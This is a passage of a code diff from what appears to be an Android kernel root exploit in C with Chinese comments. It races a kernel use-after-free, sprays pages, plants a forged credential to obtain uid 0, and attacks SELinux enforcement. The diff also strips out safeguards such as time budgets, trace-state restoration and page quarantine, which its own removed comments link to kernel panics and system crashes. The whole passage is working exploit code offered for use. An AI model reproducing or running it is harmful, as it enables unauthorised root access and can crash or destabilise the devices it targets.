-	 * 但 one_uaf 后面还有两道**真判定**：child 必须被 SIGKILL（说明
-	 * 竞态真的打中了内核的 timer 拆解路径），以及 ask_child 的
-	 * uid/euid==0（说明伪造的 cred 真的生效）。既然后面还有真判定，
-	 * 就让它们去裁决，不在回收层一票否决。
-	 */
-	uncertain = !hit && !g_page_events_live;
-	if (uncertain)
-		dprintf(STDOUT_FILENO,
-			"[reclaim] 判定不可信（事件没开火）：按可能命中继续，"
-			"由后续 child SIGKILL / uid 校验裁决\n");
-	dprintf(STDOUT_FILENO,
-		"[reclaim] writes=%d hit=%d pf=%#" PRIx64 " order=%d events_live=%d\n",
-		writes, hit, pf, order, g_page_events_live);
+	if (hit)
+		dprintf(STDOUT_FILENO, "[stream_backfill] hit pfn=%#" PRIx64 "\n", base);
+	dprintf(STDOUT_FILENO, "[stream_backfill] writes=%d hit=%d\n", writes, hit);
 	quiet_reclaim_trace();
-
-	/* --- 7. 负 uid 防护 --- */
-	/*
-	 * 铺页把内核地址写进了这些页缓冲。页一旦回到 buddy，就可能被 cred_jar
-	 * 领走，struct cred.uid（偏移 8）落在某个内核地址槽上 → 负 userId →
-	 * system_server 每分钟崩一次（软重启清不掉，须完整内核重启）。
-	 * 伪造 cred 那一路必然带内核地址（usage / selinux / user_ns …），
-	 * 所以一律隔离不释放；纯铺页那一路看 target 的低 32 位最高位。
-	 */
-	risky = g_plant_cred ? 1 : uid_risky_value(target);
-	/*
-	 * 顺序很重要：持有者必须在 close 之前 fork —— 它靠继承来的 fd
-	 * 把这些页钉在 slab 上；先 close 再 fork 就等于什么都没钉住。
-	 * 判定不可信时同样要钉：本轮**确实**铺过页，不能排除受害者页就是
-	 * 那一页，放回 buddy 就可能被 cred_jar 领走 → 负 uid。
-	 */
-	if (hit || uncertain)
-		quarantine_hold();     /* 命中/存疑这轮铺的页永远不回到 buddy */
-	if (risky) {
-		dprintf(STDOUT_FILENO,
-			"[reclaim] 铺页值含负 uid 风险位，本轮铺过的页隔离不释放；"
-			"提权后请完整重启设备\n");
-		g_quar_sets++;
-	} else {
+	munmap(pat, 8192);
+	if (!hit)
 		close_stream();
-		close_pipe_spray();
-	}
-	munmap(pat, SPRAY_BUF_MAX);
-	return (hit || uncertain) ? 0 : -1;
+	return hit ? 0 : -1;
 }
 
 static int one_uaf(uint64_t target)
@@ -2306,15 +1119,13 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
-		restore_trace_state();
 		return -1;
 	}
-	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_COLLECT)) ||
-	    trace_off_on() ||
-	    arm_kmem_cache_alloc()) {
+	if (write_file(TRACE "/buffer_size_kb", "16384\n") ||
+	    arm_kmem_cache_alloc() ||
+	    trace_off_on()) {
 		kill(child, SIGKILL);
 		stop_helpers();
-		restore_trace_state();
 		return -1;
 	}
 	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
@@ -2324,7 +1135,6 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
-		restore_trace_state();
 		return -1;
 	}
 	write_file(TRACE "/tracing_on", "0\n");
@@ -2332,7 +1142,6 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
-		restore_trace_state();
 		return -1;
 	}
 	if (nptr < 1500) {
@@ -2340,7 +1149,6 @@ static int one_uaf(uint64_t target)
 		kill(child, SIGKILL);
 		stop_helpers();
 		waitpid(child, NULL, 0);
-		restore_trace_state();
 		return -1;
 	}
 	disarm_kmem_cache_alloc();
@@ -2351,19 +1159,15 @@ static int one_uaf(uint64_t target)
 		clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
 	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=page_miss fast=%d\n", cms, g_fast);
 	dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
-	log_sync();
 		stop_helpers();
-		restore_trace_state();
 		return -1;
 	}
 	close_socks();
 	code = wait_zombie(child, &status);
 	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
 		child, code, status);
-	if (waitpid(child, &status, 0) < 0) {
-		restore_trace_state();
+	if (waitpid(child, &status, 0) < 0)
 		return -1;
-	}
 	clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
 	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=ok fast=%d\n", cms, g_fast);
 	log_sync();
@@ -2372,7 +1176,6 @@ static int one_uaf(uint64_t target)
 	stop_helpers();
 	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
 		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
-		restore_trace_state();
 		return -1;
 	}
 	return 0;
@@ -2402,57 +1205,9 @@ static void cred_child(void)
 	 * can be reclaimed under us and the cred read back as the original uid
 	 * (that is exactly the "[cred] installed" followed by "Uid: 2000" symptom).
 	 * MCL_FUTURE keeps pages allocated later (fork, heap growth) locked too.
-	 *
-	 * ⚠️ 真机 2026-10-31 18:24 实测 `mlockall errno=12`（ENOMEM）—— **整个调用
-	 * 失败，连 MCL_FUTURE 也没生效**，保护完全落空。这与「少数情况跑提权会卡死
-	 * 然后设备重启」高度吻合（页被回收 → cred 变悬空指针 → kernel panic）。
-	 *
-	 * ENOMEM 的成因：MCL_CURRENT 要锁定**全部已映射页**，而这个子进程继承了
-	 * 整个 Android 运行时的地址空间（libc / libc++ 的文本与数据，十几 MB），
-	 * Android 上 RLIMIT_MEMLOCK 又很小（uid 2000 默认 8 MB 甚至更小）→ 超额。
-	 *
-	 * 三步走，把「至少 MCL_FUTURE 生效」变成必然：
-	 *   1) 先抬 RLIMIT_MEMLOCK —— cred 子进程从 fork 起就带着伪造的 cred，
-	 *      此时已经是 uid 0，setrlimit 应当能成功（失败也无妨，继续下一步）；
-	 *   2) 再单独上 MCL_FUTURE —— 它只约束**未来**的分配，额度消耗极小，
-	 *      几乎必成；
-	 *   3) 最后叠加 MCL_CURRENT（best-effort）。第 2 步拿到的 MCL_FUTURE 在
-	 *      第 3 步失败时**依然生效**，不会像原来那样一次失败全丢。
 	 */
-	{
-		struct rlimit rl;
-		if (getrlimit(RLIMIT_MEMLOCK, &rl) == 0) {
-			dprintf(STDOUT_FILENO,
-				"[child-cred] memlock limit cur=%llu max=%llu\n",
-				(unsigned long long)rl.rlim_cur,
-				(unsigned long long)rl.rlim_max);
-			/*
-			 * 软限抬到硬限**不需要任何特权**（只有抬过硬限才需要
-			 * CAP_SYS_RESOURCE，而这里 uid 还是 2000，拿不到）。
-			 * 硬限本身在 Android 上通常比软限宽裕得多。
-			 */
-			if (rl.rlim_cur != rl.rlim_max) {
-				struct rlimit up = rl;
-				up.rlim_cur = rl.rlim_max;
-				if (setrlimit(RLIMIT_MEMLOCK, &up) != 0)
-					dprintf(STDOUT_FILENO,
-						"[child-cred] warn: setrlimit(MEMLOCK soft->hard) errno=%d\n",
-						errno);
-			}
-		} else {
-			dprintf(STDOUT_FILENO, "[child-cred] warn: getrlimit(MEMLOCK) errno=%d\n",
-				errno);
-		}
-	}
-	if (mlockall(MCL_FUTURE))
-		dprintf(STDOUT_FILENO, "[child-cred] warn: mlockall(MCL_FUTURE) errno=%d\n",
-			errno);
 	if (mlockall(MCL_CURRENT | MCL_FUTURE))
-		dprintf(STDOUT_FILENO,
-			"[child-cred] warn: mlockall(MCL_CURRENT) errno=%d "
-			"(MCL_FUTURE 仍然生效)\n", errno);
-	else
-		dprintf(STDOUT_FILENO, "[child-cred] mlockall ok (CURRENT|FUTURE)\n");
+		dprintf(STDOUT_FILENO, "[child-cred] warn: mlockall errno=%d\n", errno);
 	for (;;) {
 		unsigned uid, euid, gid, egid;
 		unsigned char go;
@@ -2488,23 +1243,7 @@ static void cred_child(void)
 				for (;;)
 					pause();
 			}
-			/*
-			 * 父进程没了（管道 EOF）。
-			 *
-			 * 这里**不能** continue：read 在已关闭的管道上立刻返回 0，
-			 * continue 回去就是 100% CPU 的死循环 —— 一个核被吃满，设备
-			 * 会被拖卡，watchdog 随后会重启它。反复重试就会攒下一堆。
-			 *
-			 * 也不能退出：退出等于把父进程钉着的那批页放掉，本进程手里
-			 * 那份伪造 cred 随即变成悬空指针，踩上去就是 kernel panic
-			 * （真机 2026-10-31 22:11 的教训）。所以正确姿势是「什么都不做」：
-			 * 安静地停在这里，等着被重启带走。
-			 */
-			dprintf(STDOUT_FILENO,
-				"[child-cred] parent gone, parking (no CPU burn)\n");
-			log_sync();
-			for (;;)
-				pause();
+			continue;
 		}
 		if (go == 0xAA) {
 			/* Daemon command: acknowledge, drop the pipes, and keep looping
@@ -2733,20 +1472,7 @@ static int leak_task(void)
 
 	if (pipe(g_wake) || pipe(g_report))
 		return -1;
-	/*
-	 * 顺序很重要：**先开 tracing，再 arm**。
-	 *
-	 * rss_stat 是**边沿触发**：kmem_cache_alloc 的 enable 靠
-	 * "enable_event:kmem:kmem_cache_alloc" 挂在 rss_stat 上，rss_stat 真正
-	 * 触发一次，事件才被打开。而 tracepoint 只有在 tracing_on=1 时才会被
-	 * 记录 —— tracing 关着的时候 kick_rss 推多少 RSS 都不会有 rss_stat 记录，
-	 * 事件就永远 enable 不上，采集到 0 条（`[uaf] captured=0 chosen=0 raw=0`）。
-	 *
-	 * 真机上 uid 2000 直接写 events 下的 enable 文件是**被拒**的（日志里
-	 * `armed=trigger enable=?`，写失败、读也读不回来），所以只剩 trigger 这
-	 * 一条路，顺序错了就必然采不到。
-	 */
-	if (trace_off_on() || arm_kmem_cache_alloc())
+	if (arm_kmem_cache_alloc() || trace_off_on())
 		return -1;
 	g_cred_child_pid = fork();
 	if (g_cred_child_pid == 0)
@@ -2929,36 +1655,12 @@ int uaf_plant_main(int argc, char **argv)
 	if (argc > 1 && argv[1][0] != '-')
 		g_shift = (unsigned)atoi(argv[1]);
 	sigaction(SIGALRM, &action, NULL);
-	/*
-	 * trace 状态是**内核全局**的：进程退出、被杀、崩溃都不会自动还原。
-	 * 注册 atexit + 可捕获信号，保证「无论怎么退出」都不会把抬高的
-	 * 环形缓冲留在内核里（那是每次失败都要扣掉的成百上千 MiB）。
-	 */
-	atexit(restore_trace_state);
-	{
-		struct sigaction fa;
-		memset(&fa, 0, sizeof(fa));
-		fa.sa_handler = on_fatal_signal;
-		sigemptyset(&fa.sa_mask);
-		fa.sa_flags = 0;
-		sigaction(SIGINT, &fa, NULL);
-		sigaction(SIGTERM, &fa, NULL);
-		sigaction(SIGHUP, &fa, NULL);
-		sigaction(SIGQUIT, &fa, NULL);
-	}
-	g_mem_total_kb = read_mem_total_kb();
-	dprintf(STDOUT_FILENO, "[mem] memtotal=%llu KB cpus=%d\n",
-		(unsigned long long)g_mem_total_kb, cpu_count());
 	ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
 		   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (ipc == MAP_FAILED)
 		return 1;
 	memset(ipc, 0, sizeof(*ipc));
-	/*
-	 * 父进程绑到 CRITICAL_CPU（和 exec 线程同一个核），避开 CPU 0 ——
-	 * 理由见 pick_cpu 上面的注释。
-	 */
-	if (pin_cpu(critical_cpu()))
+	if (pin_cpu(0))
 		return 1;
 	g_ctx = calloc(MAX_RINGS, sizeof(*g_ctx));
 	if (!g_ctx)
@@ -2967,7 +1669,7 @@ int uaf_plant_main(int argc, char **argv)
 		getuid(), geteuid(), getgid());
 	read_enforce();
 	g_nrings = 0;
-	if (write_trace_buf_kb(trace_buf_kb(MEMGUARD_BUF_KB_COLLECT)))
+	if (write_file(TRACE "/buffer_size_kb", "16384\n"))
 		dprintf(STDOUT_FILENO, "[warn] buffer_size_kb not writable, continuing\n");
 	if (leak_task()) {
 		dprintf(STDOUT_FILENO, "[task] leak failed\n");
@@ -2975,29 +1677,9 @@ int uaf_plant_main(int argc, char **argv)
 		return 5;
 	}
 	g_plant_cred = 0;
-	/*
-	 * 注入阶段的总时间预算。
-	 *
-	 * 一轮 one_uaf 最坏要 ~90 s（wait_phase 30 s ×2 + stream backfill 8 s +
-	 * wait_zombie 20 s），SELinux 阶段 12 轮 + cred 阶段 12 轮 = 最多 24 轮。
-	 * 不设预算的话最坏能跑 **30 多分钟**，而宿主那边 INJECT 超时只有 300 s：
-	 * 宿主先判失败、把原生进程留在原地继续跑，用户看到的就是「卡死在那儿不动」，
-	 * 反复重试还会攒下一堆满负荷空转的进程。
-	 *
-	 * 每轮开始前查一次预算，到点就收手：宁可这轮失败退出，也不要让设备长时间
-	 * 4 个 helper 线程 100% spin（8 核上占掉一半）。
-	 */
-	g_deadline = time(NULL) + EXPLOIT_BUDGET_SEC;
 	{
 		uint64_t sel = slide_addr(SELINUX_LINK) - 7;
-		int consec = 0;
-		/*
-		 * SELinux 阶段的墙钟上限。到点就必须收手，把剩余预算让给 cred 阶段
-		 * —— cred 阶段才是真正做提权的那一段。
-		 */
-		time_t sel_deadline = time(NULL) + SELINUX_PHASE_MAX_SEC;
-
-		for (int i = 1; i <= SELINUX_PHASE_MAX_ATTEMPTS; i++) {
+		for (int i = 1; i <= 12; i++) {
 			char buf[8] = { 0 };
 			int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
 			if (fd >= 0) {
@@ -3009,69 +1691,29 @@ int uaf_plant_main(int argc, char **argv)
 				dprintf(STDOUT_FILENO, "[selinux] already permissive\n");
 				break;
 			}
-			if (budget_exhausted() || time(NULL) >= sel_deadline ||
-			    g_deadline - time(NULL) < CRED_PHASE_RESERVE_SEC) {
-				dprintf(STDOUT_FILENO,
-					"[budget] selinux phase stopped after %d attempt(s): phase cap %d s, cred reserve %d s, total budget %d s\n",
-					i - 1, SELINUX_PHASE_MAX_SEC,
-					CRED_PHASE_RESERVE_SEC, EXPLOIT_BUDGET_SEC);
-				break;
-			}
 			dprintf(STDOUT_FILENO,
-				"[selinux] attempt %d/%d target=%#" PRIx64 "\n",
-				i, SELINUX_PHASE_MAX_ATTEMPTS, sel);
-			if (!one_uaf(sel)) {
+				"[selinux] attempt %d/12 target=%#" PRIx64 "\n",
+				i, sel);
+			if (!one_uaf(sel))
 				read_enforce();
-				consec = 0;
-			} else if (++consec >= CONSEC_FAIL_MAX) {
-				dprintf(STDOUT_FILENO,
-					"[budget] selinux phase: %d consecutive failed attempts, giving up early\n",
-					consec);
-				break;
-			}
 		}
 	}
 	g_plant_cred = 1;
 	int rooted = 0;
-	int consec = 0;
-	for (int attempt = 1; attempt <= CRED_PHASE_MAX_ATTEMPTS && !rooted; attempt++) {
+	for (int attempt = 1; attempt <= 12 && !rooted; attempt++) {
 		unsigned uid = 1, euid = 1;
 		int fixed_uid = -1, fixed_suid = -1;
-		if (budget_exhausted()) {
-			dprintf(STDOUT_FILENO,
-				"[budget] cred phase stopped after %d attempt(s): time budget %d s exhausted\n",
-				attempt - 1, EXPLOIT_BUDGET_SEC);
-			break;
-		}
-		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/%d\n", attempt,
-			CRED_PHASE_MAX_ATTEMPTS);
-		log_sync();
+		dprintf(STDOUT_FILENO, "[cred] plant attempt %d/12\n", attempt);
 		g_plant_cred = 1;
-		if (one_uaf(0)) {
-			if (++consec >= CONSEC_FAIL_MAX) {
-				dprintf(STDOUT_FILENO,
-					"[budget] cred phase: %d consecutive failed attempts, giving up early\n",
-					consec);
-				break;
-			}
+		if (one_uaf(0))
 			continue;
-		}
-		consec = 0;
 		g_plant_cred = 0;
 		dprintf(STDOUT_FILENO, "[cred] installed at %#" PRIx64 "\n", g_cred_kva);
 		log_sync();
 		log_proc_uid(g_cred_child_pid);
-		/*
-		 * 下面两个「补写 uid / suid」的循环各自最多再开 3 轮 UAF，
-		 * 所以**一轮 plant 最多是 1 + 3 + 3 = 7 次 UAF**，
-		 * 12 次 plant 加上 SELinux 阶段的 12 次，理论上能开到 **96 次** UAF。
-		 *
-		 * 每一次 UAF 都在内核的 timer 拆解路径上制造一次悬空 —— 命中内核竞态
-		 * 就是 kernel panic。所以次数本身就是崩溃概率的乘数，必须一起算进预算。
-		 */
-		for (int i = 0; i < 3 && fixed_uid && !budget_exhausted(); i++)
+		for (int i = 0; i < 3 && fixed_uid; i++)
 			fixed_uid = one_uaf(g_cred_kva + 8);
-		for (int i = 0; i < 3 && fixed_suid && !budget_exhausted(); i++)
+		for (int i = 0; i < 3 && fixed_suid; i++)
 			fixed_suid = one_uaf(g_cred_kva + 16);
 		if (ask_child(&uid, &euid) == 0 && uid == 0 && euid == 0)
 			rooted = 1;
@@ -3082,18 +1724,6 @@ int uaf_plant_main(int argc, char **argv)
 	}
 	if (!rooted) {
 		dprintf(STDOUT_FILENO, "[uaf] missed page; holding zombie\n");
-		/*
-		 * 机器可读的失败标记：宿主看到它就立刻结束等待并报错，
-		 * 不用空等满 300 s（真机实测白等 134 s 才报超时）。
-		 */
-		dprintf(STDOUT_FILENO, "%s\n", EXPLOIT_FAILED_MARKER);
-		log_sync();
-		/*
-		 * 失败路径：先把抬高的环形缓冲还回去。
-		 * 这个进程接下来会一直挂着（host 已经在标记处返回失败），
-		 * 不能让它顺手把上百 MiB 内核内存也一起挂住。
-		 */
-		restore_trace_state();
 		for (;;)
 			pause();
 	}
